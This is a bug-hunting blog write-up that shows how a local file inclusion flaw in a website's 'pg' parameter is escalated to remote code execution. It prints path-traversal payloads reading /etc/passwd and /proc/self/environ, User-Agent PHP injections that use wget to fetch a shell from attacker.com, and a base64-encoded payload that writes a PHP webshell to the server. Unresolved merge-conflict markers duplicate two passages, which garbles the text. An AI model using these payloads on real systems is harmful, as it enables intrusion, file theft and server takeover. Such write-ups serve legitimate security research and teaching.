---
title: Leveraging LFI to RCE in a website with +20000 users [Bug Hunting]
updated: 2020-10-04 13:34
---

Hello researchers and bug hunters! Recently I found an interesting attack vector which I would like to share with you. Without losing time, let’s jump into it.

Visiting the website (port 443), we see this webpage:
![port_443_webpage](https://cdn-images-1.medium.com/max/800/1*-jIy4_06oXvmiAT0N3JPRg.jpeg)

# Finding LFI vulnerability

Let’s browse through the website to see if we can find any interesting endpoint. Clicking to Contact Us leads to an interesting endpoint:

<<<<<<< HEAD
>https://www.website.com/index.php?pg=contact-us.php

![contact-us.php_webpage](https://miro.medium.com/max/700/1*3SuEkX6I9M8OzqVeI7qcjg.jpeg)
=======
>https://www.website.com/index.php?pg=contact.php

![contact.php_webpage](https://miro.medium.com/max/700/1*3SuEkX6I9M8OzqVeI7qcjg.jpeg)
>>>>>>> a318a2f4e6eb56b5e081df906255608624ac63f4

I began fuzzing the pg parameter and found that LFI was possible using the following payload:

>https://www.website.com/index.php?pg=../../../../etc/passwd

![lfi_vulnerability](https://miro.medium.com/max/700/1*zynj6J5e8JVPZXFOrZDuGQ.jpeg)

So far so good, we have LFI, but let’s try to increase the impact.

# From LFI to RCE

Using all the possible known techniques to escalate an LFI vulnerability to RCE, I found that **/proc/self/environ** was readable to us. So entering the following code leaks information:

>https://www.website.com/index.php?pg=../../../../proc/self/environ

<<<<<<< HEAD
![proc/self/environ_variables](https://miro.medium.com/max/700/1*F_JJfLWjeJxi1yIBn9hQiQ.jpeg)

Nice! Analyzing the output, we can see that the file located under **/proc/self/environ** contains several environment variables such as **HTTP_USER_AGENT**.

![user_agent_variable_detected](https://miro.medium.com/max/700/1*zmz-0wwIE-LUFsIuTTV_OA.jpeg)
=======
![proc/self/environ_variables](https://miro.medium.com/max/764/1*MTks9dkmMDHavDYew_rhKQ.jpeg)

Nice! Analyzing the output, we can see that the file located under **/proc/self/environ** contains several environment variables such as **HTTP_USER_AGENT**.

![user_agent_variable_detected](https://miro.medium.com/max/764/1*7zr1_BxEOG4YYhUrtWI27Q.jpeg)
>>>>>>> a318a2f4e6eb56b5e081df906255608624ac63f4

Sweet, let’s fire up Burp Suite and let’s send a request by changing the User-Agent value. I tried adding the following values to User-Agent:

### Tried system(), but no RCE:

```
User-Agent: <?system('wget http://attacker.com/shell.txt -O shell.php');?>
```

### Tried exec(), but no RCE:

```
User-Agent: <?exec('wget http://attacker.com/shell.txt -O shell.php');?>
```

### Tried phpinit(), but failed:

```
User-Agent: <?php phpinfo(); ?>
```

This is where I spent a lot of time, I forgot that I could try writing files inside the server, so I tried the following payload (I will explain it).

Let’s create a payload which we will use in **User-Agent** HTTP Header:

```
User-Agent: <?php $a = base64_decode('PD9waHAgCiAgJGEgPSAkX1BPU1RbJ2NvZGUnXTsKICAkZmlsZSA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwndycpOwogIEBmd3JpdGUoJGZpbGUsJGEpOwogIEBmY2xvc2UoJGZpbGUpOwo/Pgo8Y2VudGVyPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPgogICAgPGgyPkZpbGUgV3JpdGVyPC9oMj4KICAgIEZpbGUgTmFtZTxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgcGxhY2Vob2xkZXI9InNoZWxsLnBocCI+PGJyPgogICAgU2hlbGwgQ29kZTxicj48dGV4dGFyZWEgbmFtZT0iY29kZSIgZm9ybT0iZm9ybSIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgc2hlbGwgaGVyZSI+PC90ZXh0YXJlYT48YnI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iV3JpdGUiPgogIDwvZm9ybT4KPC9jZW50ZXI+Cg=='); $file = fopen('nadeshot.php','w'); echo fwrite($file,$a); fclose($file); ?>
```

## Explaining the used payload

The webshell is encoded in base64 and stored into the a variable. The original webshell php code is from: *https://github.com/alita-ido/PHP-File-Writer/blob/master/lfi-writer.php*

>$a = base64_decode('webshell_base64_encoded_code_here');

After that, we are telling the server to write a file named nadeshot.php.

>$file = fopen('nadeshot.php','w');

Then, the server will write the code (decoded base64) into nadeshot.php

>echo fwrite($file,$a);

Then, the server will save the file:

>fclose($file);

So, let’s try executing this whole payload in Burp Suite and let’s see what happens.

![getting_rce_by_user-agent](https://miro.medium.com/max/700/1*fmd1oa_tnSy526j6WMmrig.jpeg)

We got Response 200 (OK), which is good. We hope our payload got executed as planned, so let’s check if it got successfully executed by going to: *https://website.com/nadeshot.php*

![webshell_uploaded](https://miro.medium.com/max/700/1*qm5Uq8E8jJXe3T7L2CeTPQ.jpeg)

Our webshell got uploaded into */nadeshot.php* . Great, now let’s write a simple .txt file (trying not to harm the website) to see if it works.

![webshell_uploaded](https://miro.medium.com/max/700/1*HGDKCUr9H90lBJFYqsdsmw.jpeg)

I will create a text file named **nadeshot.txt**, then click “Write”.

Going into *https://website.com/nadeshot.txt* will show up our text file. We successfully increased our impact from LFI to RCE.

![webshell_uploaded](https://miro.medium.com/max/700/1*NgNTZfoS2FRgau1fo9cfXA.jpeg)
